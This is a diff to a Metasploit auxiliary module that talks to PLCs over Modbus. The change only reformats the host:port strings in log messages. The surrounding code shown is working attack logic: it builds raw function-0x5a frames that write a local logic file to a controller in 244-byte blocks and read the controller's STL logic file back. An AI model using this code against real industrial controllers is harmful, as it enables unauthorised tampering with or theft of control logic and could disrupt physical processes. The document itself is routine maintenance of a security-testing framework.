@@ -97,7 +97,7 @@ class MetasploitModule < Msf::Auxiliary
   # just prepends the payload with a modbus header
   def makeframe(packetdata)
     if packetdata.size > 255
-      print_error("#{rhost}:#{rport} - MODBUS - Packet too large: #{packetdata.inspect}")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Packet too large: #{packetdata.inspect}")
       return
     end
     payload = ''
@@ -197,12 +197,12 @@ class MetasploitModule < Msf::Auxiliary
   # Write the contents of local file filename to the target's filenumber
   # blank logic files will be available on the Digital Bond website
   def writefile
-    print_status "#{rhost}:#{rport} - MODBUS - Sending write request"
+    print_status "#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Sending write request"
     blocksize = 244	# bytes per block in file transfer
     buf = File.binread(datastore['FILENAME'])
     fullblocks = buf.length / blocksize
     if fullblocks > 255
-      print_error("#{rhost}:#{rport} - MODBUS - File too large, aborting.")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - File too large, aborting.")
       return
     end
     lastblocksize = buf.length - (blocksize * fullblocks)
@@ -234,9 +234,9 @@ class MetasploitModule < Msf::Auxiliary
     payload += filenum
     response = sendframe(makeframe(payload))
     if response[8..9] == "\x01\xfe"
-      print_status("#{rhost}:#{rport} - MODBUS - Write request success!  Writing file...")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Write request success!  Writing file...")
     else
-      print_error("#{rhost}:#{rport} - MODBUS - Write request error.  Aborting.")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Write request error.  Aborting.")
       return
     end
     payload = "\x00\x5a\x01\x04"
@@ -250,14 +250,14 @@ class MetasploitModule < Msf::Auxiliary
       payload += "\x00\xf4\x00"
       payload += buf[((block - 1) * 244)..((block * 244) - 1)]
       res = sendframe(makeframe(payload))
-      vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{payload.inspect}"
+      vprint_status "#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Block #{block}: #{payload.inspect}"
       if res[8..9] != "\x01\xfe"
-        print_error("#{rhost}:#{rport} - MODBUS - Failure writing block #{block}")
+        print_error("#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Failure writing block #{block}")
         return
       end
       # redo this iteration of the loop if we're on block 2
       if (block2status == 0) && (block == 2)
-        print_status("#{rhost}:#{rport} - MODBUS - Sending block 2 a second time")
+        print_status("#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Sending block 2 a second time")
         block2status = 1
         redo
       end
@@ -269,25 +269,25 @@ class MetasploitModule < Msf::Auxiliary
       payload += [block].pack('c')
       payload += "\x00" + [lastblocksize].pack('c') + "\x00"
       payload += buf[((block - 1) * 244)..(((block - 1) * 244) + lastblocksize)]
-      vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{payload.inspect}"
+      vprint_status "#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Block #{block}: #{payload.inspect}"
       res = sendframe(makeframe(payload))
       if res[8..9] != "\x01\xfe"
-        print_error("#{rhost}:#{rport} - MODBUS - Failure writing last block")
+        print_error("#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Failure writing last block")
         return
       end
     end
-    vprint_status "#{rhost}:#{rport} - MODBUS - Closing file"
+    vprint_status "#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Closing file"
     payload = "\x00\x5a\x01\x32\x00\x01" + [fileblocks].pack('c') + "\x00"
     sendframe(makeframe(payload))
   end
 
   # Only reading the STL file is supported at the moment :(
   def readfile
-    print_status "#{rhost}:#{rport} - MODBUS - Sending read request"
+    print_status "#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Sending read request"
     file = File.open(datastore['FILENAME'], 'wb')
     payload = "\x00\x5a\x01\x33\x00\x01\xfb\x00"
     sendframe(makeframe(payload))
-    print_status("#{rhost}:#{rport} - MODBUS - Retrieving file")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Retrieving file")
     block = 1
     filedata = ''
     finished = false
@@ -297,14 +297,14 @@ class MetasploitModule < Msf::Auxiliary
       payload += "\x00"
       response = sendframe(makeframe(payload))
       filedata += response[0xe..]
-      vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{response[0xe..].inspect}"
+      vprint_status "#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Block #{block}: #{response[0xe..].inspect}"
       if response[0xa] == "\x01" # apparently 0x00 == more data, 0x01 == eof?
         finished = true
       else
         block += 1
       end
     end
-    print_status("#{rhost}:#{rport} - MODBUS - Closing file")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - MODBUS - Closing file")
     payload = "\x00\x5a\x01\x35\x00\x01" + [block].pack('c') + "\x00"
     sendframe(makeframe(payload))
     file.print filedata
